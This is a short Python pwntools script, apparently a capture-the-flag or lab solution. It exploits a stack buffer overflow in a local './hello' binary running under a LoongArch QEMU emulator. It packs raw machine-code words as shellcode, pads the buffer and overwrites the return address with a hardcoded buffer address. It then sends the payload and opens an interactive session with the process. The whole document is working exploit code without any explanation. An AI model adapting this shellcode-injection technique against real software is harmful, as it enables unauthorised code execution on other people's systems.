#!/usr/bin/python3
code = [
    0x02c3740b, 
    0x00150006, 
    0x00150005, 
    0x14dcd2c7, 
    0x0388bce7, 
    0x170e65e7, 
    0x030018e7, 
    0x29c00067, 
    0x00150064, 
    0x002b0000, 
]

bufaddr = 0x4000802530

from pwn import *

payload = b''
for q in code:
    payload += p32(q)

payload += b'A' * (68 - len(payload))
payload += p64(bufaddr)

#write payload to file
with open('payload', 'wb') as f:
    f.write(payload)

p = process(["./qemu-loongarch64", "./hello"])

p.recvline()
p.send(payload)

p.interactive()
